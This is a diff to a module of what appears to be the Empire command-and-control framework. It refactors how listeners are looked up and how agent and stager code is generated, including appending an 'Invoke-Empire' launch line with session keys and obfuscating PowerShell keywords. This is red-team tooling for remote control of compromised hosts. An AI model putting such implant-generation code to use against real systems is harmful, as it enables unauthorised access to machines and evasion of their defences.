@@ -26,22 +26,21 @@ class Module(object):
             language = params['Language']
             version = ''
 
-        if listener_name not in main_menu.listeners.activeListeners:
-            return handle_error_message("[!] Error: %s not an active listener")
-    
-        active_listener = main_menu.listeners.activeListeners[listener_name]
-    
+        active_listener = main_menu.listenersv2.get_active_listener_by_name(listener_name)
+        if not active_listener:
+            return handle_error_message("[!] Listener '%s' doesn't exist!" % (listener_name))
+
         chars = string.ascii_uppercase + string.digits
         session_id = helpers.random_string(length=8, charset=chars)
-        staging_key = active_listener['options']['StagingKey']['Value']
-        delay = active_listener['options']['DefaultDelay']['Value']
-        jitter = active_listener['options']['DefaultJitter']['Value']
-        profile = active_listener['options']['DefaultProfile']['Value']
-        kill_date = active_listener['options']['KillDate']['Value']
-        working_hours = active_listener['options']['WorkingHours']['Value']
-        lost_limit = active_listener['options']['DefaultLostLimit']['Value']
-        if 'Host' in active_listener['options']:
-            host = active_listener['options']['Host']['Value']
+        staging_key = active_listener.options['StagingKey']['Value']
+        delay = active_listener.options['DefaultDelay']['Value']
+        jitter = active_listener.options['DefaultJitter']['Value']
+        profile = active_listener.options['DefaultProfile']['Value']
+        kill_date = active_listener.options['KillDate']['Value']
+        working_hours = active_listener.options['WorkingHours']['Value']
+        lost_limit = active_listener.options['DefaultLostLimit']['Value']
+        if 'Host' in active_listener.options:
+            host = active_listener.options['Host']['Value']
         else:
             host = ''
     
@@ -52,9 +51,9 @@ class Module(object):
     
         # get the agent's session key
         session_key = main_menu.agents.get_agent_session_key_db(session_id)
-    
-        agent_code = main_menu.listeners.loadedListeners[active_listener['moduleName']].generate_agent(
-            active_listener['options'], language=language, version=version)
+
+        agent_code = main_menu.listenertemplatesv2.new_instance(active_listener['moduleName']).generate_agent(
+            active_listener.options, language=language, version=version)
     
         if language.lower() == 'powershell':
             agent_code += "\nInvoke-Empire -Servers @('%s') -StagingKey '%s' -SessionKey '%s' -SessionID '%s';" % (
@@ -62,8 +61,8 @@ class Module(object):
             # Get the random function name generated at install and patch the stager with the proper function name
             code = data_util.keyword_obfuscation(agent_code)
         else:
-            stager_code = main_menu.listeners.loadedListeners[active_listener['moduleName']].generate_stager(
-                active_listener['options'], language=language, encrypt=False)
+            stager_code = main_menu.listenertemplatesv2.new_instance(active_listener['moduleName']).generate_stager(
+                active_listener.options, language=language, encrypt=False)
             stager_code = stager_code.replace('exec(agent)', '')
             code = f"server='{host}';\n" + stager_code + f"\n{agent_code}"
 
